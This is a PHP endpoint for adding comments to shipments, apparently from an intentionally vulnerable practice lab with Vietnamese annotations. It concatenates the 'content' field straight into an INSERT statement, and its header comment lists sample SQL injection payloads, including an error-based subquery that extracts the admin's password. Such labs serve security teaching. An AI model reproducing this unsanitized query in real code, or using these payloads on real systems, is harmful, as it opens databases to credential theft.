<?php
/**
 * comment_add.php — Them binh luan (INSERT): POST /shipments/{id}/comments
 *
 * !!! DIEM INJECT: INSERT injection !!!
 * 'content' noi thang vao VALUES(...) -> error-based / sub-query khi ghi.
 * Payload mau (content):
 *   test','2020-01-01');-- -                      (dong VALUES som)
 *   test'||(SELECT extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin'))))||'
 *   Voi endpoint stacked (/admin/console) co the chain INSERT tuy y.
 */
$u = current_user();
if (!$u) { header('Location: /login'); exit; }

$shipment_id = intval($_GET['shipment_id'] ?? 0);
$content     = $_POST['content'] ?? '';

// !!! NOI CHUOI content vao VALUES — khong sanitize -> INSERT injection !!!
$sql = "INSERT INTO comments (shipment_id, user_id, content) VALUES "
     . "($shipment_id, " . intval($u['id']) . ", '$content')";

render_header('Thêm bình luận');
echo '<div class="card"><h1>Thêm bình luận</h1>';
echo '<div class="query-box">' . htmlspecialchars($sql) . '</div>';

if (exec_write($sql)) {
    flash('Đã thêm bình luận.', 'success');
}
echo '<p class="muted"><a href="/shipments/' . $shipment_id . '">← Về đơn hàng</a></p></div>';
render_footer();
